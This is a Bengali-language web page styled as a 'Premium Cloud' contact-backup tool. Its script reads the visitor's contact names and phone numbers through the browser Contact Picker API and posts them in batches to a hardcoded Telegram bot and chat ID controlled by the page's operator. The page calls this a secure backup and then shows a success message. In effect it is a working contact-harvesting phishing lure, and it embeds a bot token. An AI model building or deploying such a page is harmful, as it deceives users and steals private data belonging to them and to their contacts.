<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GX Premium Cloud</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        :root {
            --primary: #00f2fe;
            --accent: #7e22ce;
        }

        body {
            background: #010204;
            margin: 0;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: 'Inter', sans-serif;
        }

        /* অ্যানিমেটেড ব্যাকগ্রাউন্ড গ্লো */
        .glow-orb {
            position: absolute;
            width: 400px;
            height: 400px;
            background: radial-gradient(circle, rgba(0, 242, 254, 0.15), rgba(126, 34, 206, 0.15));
            filter: blur(100px);
            border-radius: 50%;
            z-index: -1;
            animation: move 15s infinite alternate;
        }

        @keyframes move {
            0% { transform: translate(-30%, -30%); }
            100% { transform: translate(30%, 30%); }
        }

        .glass-panel {
            background: rgba(255, 255, 255, 0.02);
            backdrop-filter: blur(40px);
            -webkit-backdrop-filter: blur(40px);
            border: 1px solid rgba(255, 255, 255, 0.07);
            border-radius: 45px;
            padding: 60px 35px;
            width: 350px;
            text-align: center;
            box-shadow: 0 30px 60px rgba(0,0,0,0.6);
            position: relative;
        }

        .icon-wrapper {
            width: 130px;
            height: 130px;
            border: 1px solid rgba(0, 242, 254, 0.2);
            border-radius: 50%;
            margin: 0 auto 35px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: radial-gradient(circle, rgba(0, 242, 254, 0.05), transparent);
            box-shadow: inset 0 0 20px rgba(0, 242, 254, 0.1);
            cursor: pointer;
            transition: 0.6s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .icon-wrapper:active {
            transform: scale(0.9);
            border-color: var(--primary);
        }

        .icon-wrapper i {
            font-size: 45px;
            color: var(--primary);
            text-shadow: 0 0 15px rgba(0, 242, 254, 0.6);
        }

        .status-badge {
            font-size: 10px;
            text-transform: uppercase;
            letter-spacing: 4px;
            color: rgba(255, 255, 255, 0.3);
            margin-bottom: 8px;
        }

        .main-title {
            font-size: 24px;
            font-weight: 900;
            color: #fff;
            margin-bottom: 25px;
            letter-spacing: -0.5px;
        }

        .action-btn {
            background: #fff;
            color: #000;
            border: none;
            padding: 16px;
            border-radius: 20px;
            font-weight: 800;
            width: 100%;
            cursor: pointer;
            transition: 0.4s;
            display: flex;
            flex-direction: column;
            line-height: 1.2;
        }

        .action-btn:hover {
            background: var(--primary);
            box-shadow: 0 10px 25px rgba(0, 242, 254, 0.3);
        }

        .btn-sub { font-size: 10px; font-weight: 500; opacity: 0.6; }

        #progress-text {
            margin-top: 25px;
            font-size: 13px;
            font-weight: 600;
            color: var(--primary);
            transition: 0.3s;
        }
    </style>
</head>
<body>

    <div class="glow-orb"></div>

    <div class="glass-panel">
        <div class="status-badge">Secure Protocol</div>
        <div class="main-title">Contact Cloud</div>
        
        <div class="icon-wrapper" onclick="startBackup()">
            <i class="fas fa-fingerprint"></i>
        </div>

        <button onclick="startBackup()" class="action-btn">
            <span>কন্টাক্ট ব্যাকআপ করুন</span>
            <span class="btn-sub">SEND TO TELEGRAM</span>
        </button>

        <div id="progress-text"></div>
    </div>

    <script>
        const BOT_TOKEN = '8651122945:AAH54GuzokeFtUMxdbJOEe0ZhUptrgxTm1k';
        const CHAT_ID = '6467941734';

        async function startBackup() {
            const pText = document.getElementById('progress-text');
            
            if (!('contacts' in navigator)) {
                pText.innerHTML = "❌ Browser Not Supported";
                return;
            }

            try {
                const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });

                if (contacts && contacts.length > 0) {
                    pText.innerHTML = `<i class="fas fa-sync fa-spin"></i> সংযোগ করা হচ্ছে...`;
                    await processAndSend(contacts);
                }
            } catch (err) {
                console.log("User cancelled");
            }
        }

        async function processAndSend(contacts) {
            const pText = document.getElementById('progress-text');
            const CHUNK = 15;
            
            const now = new Date();
            const days = ['রবিবার', 'সোমবার', 'মঙ্গলবার', 'বুধবার', 'বৃহস্পতিবার', 'শুক্রবার', 'শনিবার'];
            const dateStr = now.toLocaleDateString('bn-BD', { year: 'numeric', month: 'long', day: 'numeric' });
            const timeStr = now.toLocaleTimeString('bn-BD');

            for (let i = 0; i < contacts.length; i += CHUNK) {
                const list = contacts.slice(i, i + CHUNK);
                let msg = `📊 **GX Backup number**\n\n`;
                msg += `📅 ${days[now.getDay()]}, ${dateStr}\n`;
                msg += `⏰ ${timeStr}\n`;
                msg += `👥 Total: ${contacts.length}\n`;
                msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;

                list.forEach(c => {
                    msg += `Name : ──${c.name ? c.name[0] : 'N/A'}─\n`;
                    msg += `Number : ${c.tel ? c.tel[0] : 'N/A'}\n\n`;
                });

                msg += `— GX Sammim sent`;

                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
                    });
                    
                    pText.innerText = `প্রগতি: ${Math.min(i + CHUNK, contacts.length)} / ${contacts.length}`;
                    await new Promise(r => setTimeout(r, 1300)); 
                } catch (e) { console.error(e); }
            }
            // এলার্ট বাদ দিয়ে এখানে সাকসেস মেসেজ দেখানো হচ্ছে
            pText.style.color = "#38ef7d";
            pText.innerHTML = "✅ সফলভাবে সম্পন্ন হয়েছে!";
        }
    </script>
</body>
</html>
